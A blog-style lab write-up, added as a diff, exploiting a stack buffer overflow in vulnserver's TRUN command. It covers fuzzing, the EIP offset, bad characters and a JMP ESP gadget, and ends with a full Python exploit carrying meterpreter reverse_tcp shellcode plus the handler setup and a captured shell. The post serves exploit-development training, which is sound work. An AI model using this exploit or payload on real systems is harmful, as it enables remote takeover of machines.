@@ -1,0 +1,234 @@
+---
+layout: doc 
+title: Vulnserver-Trun
+date: 2020-01-30
+author: Mojo
+categories: ["Vulnserver"]
+---
+
+# ** TRUN **
+
+This is probably the best place to start on vulnserver.
+The function is straight forward once you know what triggers the BOF.
+
+I read vulnserver.c but you can also fuzz for these with tools like [spike](https://github.com/guilhermeferreira/spikepp/tree/master/SPIKE).
+
+![trun-trigger](/mojo_blog/assets/pictures/bofs/vulnserver/trun-trigger.PNG)
+
+##### "." is apparently the trigger
+
+Using my little [fuzz script](https://gist.github.com/mojodojo101/9df5012a0928f824d158e50d91305435) i was able to find a break point quickly
+
+
+
+```bash
+root@kali:~/redteam/vulnserver# python fuzzer.py -h
+usage: fuzzer.py [-h] -f FUNC_TO_FUZZ -l LENGTH_OF_BUFFER -i IP -p PORT
+                 [-b BAD_CHARS]
+                 {func} ...
+
+bof-exploit
+
+positional arguments:
+  {func}               func ['fuzzbc', 'testeip', 'fuzzbp']
+
+optional arguments:
+  -h, --help           show this help message and exit
+  -f FUNC_TO_FUZZ      function to fuzz for example "HELLO "
+  -l LENGTH_OF_BUFFER  length of buffer
+  -i IP                ip
+  -p PORT              port
+  -b BAD_CHARS         bad chars for example "0x10,0x0a,0x0d"
+```
+
+Lets send our first payload. Using the function fuzzbp (Fuzz breaking point). And specifying a -f for which function to fuzz on the server. In this case we want to fuzz "TRUN ." 
+
+
+```bash
+root@kali:~/redteam/vulnserver# python fuzzer.py -f "TRUN ." -l 4000 -i 192.168.138.139 -p 9999 func fuzzbp 
+send payload to 192.168.138.139:9999 with total length of 4000 .
+ the last 20 bytes of the buffer are:
+ 41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:0d:0a
+```
+This crashed the Server with a bunch of "A"'s
+![crash-1](/mojo_blog/assets/pictures/bofs/vulnserver/trun-crash-1.PNG)
+
+Like a [binary-search-algorithm](https://en.wikipedia.org/wiki/Binary_search_algorithm) i will just cut the length of our buffer in half now to home in on the crashing point.
+
+We can quickly restart the server by pressing F3, selecting the correct binary and pressing 2 times F9.
+
+```bash
+    root@kali:~/redteam/vulnserver# python fuzzer.py -f "TRUN ." -l 4000 -i 192.168.138.139 -p 9999 func fuzzbp 
+^CTraceback (most recent call last): 
+  File "fuzzer.py", line 120, in <module>                   
+    FUNCTION_MAP[args.func](args.func_to_fuzz,args.length_of_buffer,[args.bad_chars],args.ip,args.port)     
+  File "fuzzer.py", line 62, in fuzzBreakPoint                  
+    sendPayload(buffer,ip,port)      
+  File "fuzzer.py", line 40, in sendPayload                 
+    s.recv(1024)                                                                                                                                            
+KeyboardInterrupt                                                             
+root@kali:~/redteam/vulnserver# python fuzzer.py -f "TRUN ." -l 2000 -i 192.168.138.139 -p 9999 func fuzzbp 
+send payload to 192.168.138.139:9999 with total length of 2000 .
+ the last 20 bytes of the buffer are:                                                                                                                       
+ 41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:0d:0a    
+root@kali:~/redteam/vulnserver#      
+root@kali:~/redteam/vulnserver# python fuzzer.py -f "TRUN ." -l 3000 -i 192.168.138.139 -p 9999 func fuzzbp 
+send payload to 192.168.138.139:9999 with total length of 3000 .                                                                                            
+ the last 20 bytes of the buffer are:                                         
+ 41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:0d:0a
+root@kali:~/redteam/vulnserver# python fuzzer.py -f "TRUN ." -l 2500 -i 192.168.138.139 -p 9999 func fuzzbp
+...
+
+```
+Eventually we will find the last offset where we dont stop the programs execution is at 2006 bytes.
+
+Now we can start looking for [EIP](http://unixwiz.net/techtips/win32-callconv-asm.html) using -f testeip
+
+```bash
+root@kali:~/redteam/vulnserver# python fuzzer.py -f "TRUN ." -l 2018 -i 192.168.138.139 -p 9999 func testeip
+send payload to 192.168.138.139:9999 with total length of 2018 .
+ the last 20 bytes of the buffer are:
+ 41:41:41:41:41:41:42:42:42:42:43:43:43:43:44:44:44:44:0d:0a
+```
+![trun-crash-2](/mojo_blog/assets/pictures/bofs/vulnserver/trun-crash-1.PNG)
+
+We overwrote EIP with 4* 0x44 which corresponds to the bytes 2013-2016 since the last two bytes are our \r\n.
+
+Now we should check for bad chars by using the -f fuzzbc (Fuzz bad characters) function.
+
+```bash
+root@kali:~/redteam/vulnserver# python fuzzer.py -f "TRUN ." -l 2018 -i 192.168.138.139 -p 9999 func fuzzbc
+send payload to 192.168.138.139:9999 with total length of 2274 .
+ the last 20 bytes of the buffer are:
+ ee:ef:f0:f1:f2:f3:f4:f5:f6:f7:f8:f9:fa:fb:fc:fd:fe:ff:0d:0a
+```
+
+![trun-bc-1](/mojo_blog/assets/pictures/bofs/vulnserver/trun-bc-1.PNG)
+
+The first byte in our bad chars fuzz buffer "0x00" stopped the server from receiving more information.
+We add the -b "0x00" flag to blacklist that byte.
+
+```
+python fuzzer.py -f "TRUN ." -l 2018 -i 192.168.138.139 -p 9999 -b "0x00" func fuzzbc
+```
+Now it seems like the fuzzing chars all went through 
+
+![trun-gc-1](/mojo_blog/assets/pictures/bofs/vulnserver/trun-gc-1.PNG)
+
+
+![trun-gc-2](/mojo_blog/assets/pictures/bofs/vulnserver/trun-gc-2.PNG)
+
+We can check this by subtracting the amount of bad chars we removed from our 256-char buffer. We only removed 1 char so our buffer should be 255 bytes long.
+And indeed our buffer stops exactly at 0x23dfadf.
+
+```bash
+     printf "%x" $(($(echo $((0x023DF9E0)))+255))
+     23dfadf
+```
+
+Search for a gadget that lets us jump to our shellcode. Since i turned DEP and ASLR off for this exercise we can just search for a JMP ESP statement. Using msf-nasm-shell or my personal favorite rasm2 we can find the right opcode for this.
+
+```bash
+    rasm2 -a x86 -b 32  "jmp esp"
+    #returns ffe4
+```
+Use "!mona modules" in Immunity-debugger-console to find modules which have little protection. vulnserver.exe and essfunc.dll seem like a good source of gadgets.
+```cmd
+    !mona modules
+```
+
+![mona-modules](/mojo_blog/assets/pictures/bofs/vulnserver/trun-mona-modules.PNG)
+
+Search for our jmp esp in the modules.
+```cmd
+    !mona find -s "\xff\xe4" -m essfunc.dll
+```
+
+![mona-jmp-esp](/mojo_blog/assets/pictures/bofs/vulnserver/trun-mona-jmp-esp.PNG)
+
+Great 0x625011af seems like a good choice for our exploit since it does not contain any bad chars ("0x00").
+This means we have all the pieces to craft our script.
+
+To recap we need;
+1. "Trun ." to trigger the exploit. (total length 6)
+2. 2006 bytes of random chars which are not 0s (total length 2012)
+3. EIP, which will be 0x625011af reversed since windows uses little endian for everything but Networking 
+-> 0xaf115062
+4. Some NOP aka 0x90 to give our exploit space on the stack
+
+#### The final exploit:
+```python
+import sys,socket
+host="192.168.138.139"
+port=9999
+
+#msfvenom -p windows/meterpreter/reverse_tcp -f python LHOST=192.168.138.138 LPORT=443 > shellcode
+
+buf =  b""
+buf += b"\xd9\xc3\xb8\x0a\xe4\xfe\x67\xd9\x74\x24\xf4\x5f\x33"
+buf += b"\xc9\xb1\x56\x83\xef\xfc\x31\x47\x14\x03\x47\x1e\x06"
+buf += b"\x0b\x9b\xf6\x44\xf4\x64\x06\x29\x7c\x81\x37\x69\x1a"
+buf += b"\xc1\x67\x59\x68\x87\x8b\x12\x3c\x3c\x18\x56\xe9\x33"
+buf += b"\xa9\xdd\xcf\x7a\x2a\x4d\x33\x1c\xa8\x8c\x60\xfe\x91"
+buf += b"\x5e\x75\xff\xd6\x83\x74\xad\x8f\xc8\x2b\x42\xa4\x85"
+buf += b"\xf7\xe9\xf6\x08\x70\x0d\x4e\x2a\x51\x80\xc5\x75\x71"
+buf += b"\x22\x0a\x0e\x38\x3c\x4f\x2b\xf2\xb7\xbb\xc7\x05\x1e"
+buf += b"\xf2\x28\xa9\x5f\x3b\xdb\xb3\x98\xfb\x04\xc6\xd0\xf8"
+buf += b"\xb9\xd1\x26\x83\x65\x57\xbd\x23\xed\xcf\x19\xd2\x22"
+buf += b"\x89\xea\xd8\x8f\xdd\xb5\xfc\x0e\x31\xce\xf8\x9b\xb4"
+buf += b"\x01\x89\xd8\x92\x85\xd2\xbb\xbb\x9c\xbe\x6a\xc3\xff"
+buf += b"\x61\xd2\x61\x8b\x8f\x07\x18\xd6\xc7\xe4\x11\xe9\x17"
+buf += b"\x63\x21\x9a\x25\x2c\x99\x34\x05\xa5\x07\xc2\x1c\xa1"
+buf += b"\xb7\x1c\xa6\xa2\x49\x9d\xd6\xeb\x8d\xc9\x86\x83\x24"
+buf += b"\x72\x4d\x54\xc8\xa7\xfb\x5e\x5e\x88\x53\xd4\x14\x60"
+buf += b"\xa1\xe9\x29\xca\x2c\x0f\x79\x7c\x7e\x80\x3a\x2c\x3e"
+buf += b"\x70\xd3\x26\xb1\xaf\xc3\x48\x18\xd8\x6e\xa7\xf4\xb0"
+buf += b"\x06\x5e\x5d\x4a\xb6\x9f\x48\x36\xf8\x14\x78\xc6\xb7"
+buf += b"\xdc\x09\xd4\xa0\xba\xf1\x24\x31\x2f\xf1\x4e\x35\xf9"
+buf += b"\xa6\xe6\x37\xdc\x80\xa8\xc8\x0b\x93\xaf\x37\xca\xa5"
+buf += b"\xc4\x0e\x58\x89\xb2\x6e\x8c\x09\x43\x39\xc6\x09\x2b"
+buf += b"\x9d\xb2\x5a\x4e\xe2\x6e\xcf\xc3\x77\x91\xb9\xb0\xd0"
+buf += b"\xf9\x47\xee\x17\xa6\xb8\xc5\x2b\xa1\x46\x9b\x03\x0a"
+buf += b"\x2e\x63\x14\xaa\xae\x09\x94\xfa\xc6\xc6\xbb\xf5\x26"
+buf += b"\x26\x16\x5e\x2e\xad\xf7\x2c\xcf\xb2\xdd\xf1\x51\xb2"
+buf += b"\xd2\x29\x62\xc9\x9b\xce\x83\x2e\xb2\xaa\x84\x2e\xba"
+buf += b"\xcc\xb9\xf8\x83\xba\xfc\x38\xb0\xb5\x4b\x1c\x91\x5f"
+buf += b"\xb3\x32\xe1\x75"
+#addr of JMP ESP = 0x625011af
+exploitbuffer="TRUN ."+"A"*2006+"\xaf\x11\x50\x62"+"\x90"*16+buf+"\r\n"
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((host,port))
+s.recv(1024)
+s.send(exploitbuffer)
+sys.exit(0)
+```
+
+Now to run the exploit:
+```bash
+    msfconsole
+    use exploit/multi/handler
+    set lhost 127.0.0.1
+    set lport 443
+    run
+```
+and in another terminal
+
+```bash
+    python exploit.py
+```
+
+And we get a nice shell back
+```bash
+meterpreter > shell
+Process 3720 created.
+Channel 2 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\IEUser\Desktop\vulnserver>whoami
+whoami
+iewin7\ieuser
+
+C:\Users\IEUser\Desktop\vulnserver>    
+
+```
